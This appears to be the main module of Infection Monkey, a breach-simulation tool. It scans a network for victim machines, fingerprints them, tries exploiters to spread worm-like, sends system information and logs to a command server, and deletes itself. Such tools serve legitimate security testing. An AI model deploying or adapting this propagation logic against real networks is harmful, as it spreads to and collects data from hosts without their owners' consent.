import argparse
import logging
import os
import subprocess
import sys
import time
from six.moves import xrange

import infection_monkey.tunnel as tunnel
import infection_monkey.utils as utils
from infection_monkey.config import WormConfiguration
from infection_monkey.control import ControlClient
from infection_monkey.model import DELAY_DELETE_CMD
from infection_monkey.network.firewall import app as firewall
from infection_monkey.network.network_scanner import NetworkScanner
from infection_monkey.system_info import SystemInfoCollector
from infection_monkey.system_singleton import SystemSingleton
from infection_monkey.telemetry.attack.victim_host_telem import VictimHostTelem
from infection_monkey.windows_upgrader import WindowsUpgrader
from infection_monkey.post_breach.post_breach_handler import PostBreach
from common.utils.attack_utils import ScanStatus
from infection_monkey.exploit.tools import get_interface_to_target

__author__ = 'itamar'

LOG = logging.getLogger(__name__)


class InfectionMonkey(object):
    def __init__(self, args):
        self._keep_running = False
        self._exploited_machines = set()
        self._fail_exploitation_machines = set()
        self._singleton = SystemSingleton()
        self._parent = None
        self._default_tunnel = None
        self._args = args
        self._network = None
        self._dropper_path = None
        self._exploiters = None
        self._fingerprint = None
        self._default_server = None
        self._default_server_port = None
        self._depth = 0
        self._opts = None
        self._upgrading_to_64 = False

    def initialize(self):
        LOG.info("Monkey is initializing...")

        if not self._singleton.try_lock():
            raise Exception("Another instance of the monkey is already running")

        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument('-p', '--parent')
        arg_parser.add_argument('-t', '--tunnel')
        arg_parser.add_argument('-s', '--server')
        arg_parser.add_argument('-d', '--depth', type=int)
        self._opts, self._args = arg_parser.parse_known_args(self._args)

        self._parent = self._opts.parent
        self._default_tunnel = self._opts.tunnel
        self._default_server = self._opts.server
        try:
            self._default_server_port = self._default_server.split(':')[1]
        except KeyError:
            self._default_server_port = ''
        if self._opts.depth:
            WormConfiguration._depth_from_commandline = True
        self._keep_running = True
        self._network = NetworkScanner()
        self._dropper_path = sys.argv[0]

        if self._default_server:
            if self._default_server not in WormConfiguration.command_servers:
                LOG.debug("Added default server: %s" % self._default_server)
                WormConfiguration.command_servers.insert(0, self._default_server)
            else:
                LOG.debug("Default server: %s is already in command servers list" % self._default_server)

    def start(self):
        LOG.info("Monkey is running...")

        if not ControlClient.find_server(default_tunnel=self._default_tunnel):
            LOG.info("Monkey couldn't find server. Going down.")
            return

        # Create a dir for monkey files if there isn't one
        utils.create_monkey_dir()

        if WindowsUpgrader.should_upgrade():
            self._upgrading_to_64 = True
            self._singleton.unlock()
            LOG.info("32bit monkey running on 64bit Windows. Upgrading.")
            WindowsUpgrader.upgrade(self._opts)
            return

        ControlClient.wakeup(parent=self._parent)
        ControlClient.load_control_config()

        if not WormConfiguration.alive:
            LOG.info("Marked not alive from configuration")
            return

        if firewall.is_enabled():
            firewall.add_firewall_rule()

        monkey_tunnel = ControlClient.create_control_tunnel()
        if monkey_tunnel:
            monkey_tunnel.start()

        ControlClient.send_telemetry("state", {'done': False})

        self._default_server = WormConfiguration.current_server
        LOG.debug("default server: %s" % self._default_server)
        ControlClient.send_telemetry("tunnel", {'proxy': ControlClient.proxies.get('https')})

        if WormConfiguration.collect_system_info:
            LOG.debug("Calling system info collection")
            system_info_collector = SystemInfoCollector()
            system_info = system_info_collector.get_info()
            ControlClient.send_telemetry("system_info_collection", system_info)

        # Executes post breach actions
        PostBreach().execute()

        if 0 == WormConfiguration.depth:
            LOG.debug("Reached max depth, shutting down")
            ControlClient.send_telemetry("trace", "Reached max depth, shutting down")
            return
        else:
            LOG.debug("Running with depth: %d" % WormConfiguration.depth)

        for iteration_index in xrange(WormConfiguration.max_iterations):
            ControlClient.keepalive()
            ControlClient.load_control_config()

            self._network.initialize()

            self._exploiters = WormConfiguration.exploiter_classes

            self._fingerprint = [fingerprint() for fingerprint in WormConfiguration.finger_classes]

            if not self._keep_running or not WormConfiguration.alive:
                break

            machines = self._network.get_victim_machines(max_find=WormConfiguration.victims_max_find,
                                                         stop_callback=ControlClient.check_for_stop)
            is_empty = True
            for machine in machines:
                if ControlClient.check_for_stop():
                    break

                is_empty = False
                for finger in self._fingerprint:
                    LOG.info("Trying to get OS fingerprint from %r with module %s",
                             machine, finger.__class__.__name__)
                    finger.get_host_fingerprint(machine)

                ControlClient.send_telemetry('scan', {'machine': machine.as_dict(),
                                                      'service_count': len(machine.services)})

                # skip machines that we've already exploited
                if machine in self._exploited_machines:
                    LOG.debug("Skipping %r - already exploited",
                              machine)
                    continue
                elif machine in self._fail_exploitation_machines:
                    if WormConfiguration.retry_failed_explotation:
                        LOG.debug("%r - exploitation failed before, trying again", machine)
                    else:
                        LOG.debug("Skipping %r - exploitation failed before", machine)
                        continue

                if monkey_tunnel:
                    monkey_tunnel.set_tunnel_for_host(machine)
                if self._default_server:
                    machine.set_default_server(get_interface_to_target(machine.ip_addr) +
                                               (':'+self._default_server_port if self._default_server_port else ''))
                    LOG.debug("Default server: %s set to machine: %r" % (self._default_server, machine))

                # Order exploits according to their type
                if WormConfiguration.should_exploit:
                    self._exploiters = sorted(self._exploiters, key=lambda exploiter_: exploiter_.EXPLOIT_TYPE.value)
                    host_exploited = False
                    for exploiter in [exploiter(machine) for exploiter in self._exploiters]:
                        if self.try_exploiting(machine, exploiter):
                            host_exploited = True
                            VictimHostTelem('T1210', ScanStatus.USED, machine=machine).send()
                            break
                    if not host_exploited:
                        self._fail_exploitation_machines.add(machine)
                        VictimHostTelem('T1210', ScanStatus.SCANNED, machine=machine).send()
                if not self._keep_running:
                    break

            if (not is_empty) and (WormConfiguration.max_iterations > iteration_index + 1):
                time_to_sleep = WormConfiguration.timeout_between_iterations
                LOG.info("Sleeping %d seconds before next life cycle iteration", time_to_sleep)
                time.sleep(time_to_sleep)

        if self._keep_running and WormConfiguration.alive:
            LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)
        elif not WormConfiguration.alive:
            LOG.info("Marked not alive from configuration")

        # if host was exploited, before continue to closing the tunnel ensure the exploited host had its chance to
        # connect to the tunnel
        if len(self._exploited_machines) > 0:
            time_to_sleep = WormConfiguration.keep_tunnel_open_time
            LOG.info("Sleeping %d seconds for exploited machines to connect to tunnel", time_to_sleep)
            time.sleep(time_to_sleep)

        if monkey_tunnel:
            monkey_tunnel.stop()
            monkey_tunnel.join()

    def cleanup(self):
        LOG.info("Monkey cleanup started")
        self._keep_running = False

        if self._upgrading_to_64:
            InfectionMonkey.close_tunnel()
            firewall.close()
        else:
            ControlClient.send_telemetry("state", {'done': True})  # Signal the server (before closing the tunnel)
            InfectionMonkey.close_tunnel()
            firewall.close()
            if WormConfiguration.send_log_to_server:
                self.send_log()
            self._singleton.unlock()

        utils.remove_monkey_dir()
        InfectionMonkey.self_delete()
        LOG.info("Monkey is shutting down")

    @staticmethod
    def close_tunnel():
        tunnel_address = ControlClient.proxies.get('https', '').replace('https://', '').split(':')[0]
        if tunnel_address:
            LOG.info("Quitting tunnel %s", tunnel_address)
            tunnel.quit_tunnel(tunnel_address)

    @staticmethod
    def self_delete():
        if WormConfiguration.self_delete_in_cleanup \
                and -1 == sys.executable.find('python'):
            try:
                if "win32" == sys.platform:
                    from _subprocess import SW_HIDE, STARTF_USESHOWWINDOW, CREATE_NEW_CONSOLE
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = SW_HIDE
                    subprocess.Popen(DELAY_DELETE_CMD % {'file_path': sys.executable},
                                     stdin=None, stdout=None, stderr=None,
                                     close_fds=True, startupinfo=startupinfo)
                else:
                    os.remove(sys.executable)
            except Exception as exc:
                LOG.error("Exception in self delete: %s", exc)

    def send_log(self):
        monkey_log_path = utils.get_monkey_log_path()
        if os.path.exists(monkey_log_path):
            with open(monkey_log_path, 'r') as f:
                log = f.read()
        else:
            log = ''

        ControlClient.send_log(log)

    def try_exploiting(self, machine, exploiter):
        """
        Workflow of exploiting one machine with one exploiter
        :param machine: Machine monkey tries to exploit
        :param exploiter: Exploiter to use on that machine
        :return: True if successfully exploited, False otherwise
        """
        if not exploiter.is_os_supported():
            LOG.info("Skipping exploiter %s host:%r, os is not supported",
                     exploiter.__class__.__name__, machine)
            return False

        LOG.info("Trying to exploit %r with exploiter %s...", machine, exploiter.__class__.__name__)

        result = False
        try:
            exploiter.set_start_time()
            result = exploiter.exploit_host()
            exploiter.set_finish_time()
            if result:
                self.successfully_exploited(machine, exploiter)
                return True
            else:
                LOG.info("Failed exploiting %r with exploiter %s", machine, exploiter.__class__.__name__)

        except Exception as exc:
            LOG.exception("Exception while attacking %s using %s: %s",
                          machine, exploiter.__class__.__name__, exc)
        finally:
            exploiter.send_exploit_telemetry(result)
        return False

    def successfully_exploited(self, machine, exploiter):
        """
        Workflow of registering successfully exploited machine
        :param machine: machine that was exploited
        :param exploiter: exploiter that succeeded
        """
        self._exploited_machines.add(machine)

        LOG.info("Successfully propagated to %s using %s",
                 machine, exploiter.__class__.__name__)

        # check if max-exploitation limit is reached
        if WormConfiguration.victims_max_exploit <= len(self._exploited_machines):
            self._keep_running = False

            LOG.info("Max exploited victims reached (%d)", WormConfiguration.victims_max_exploit)
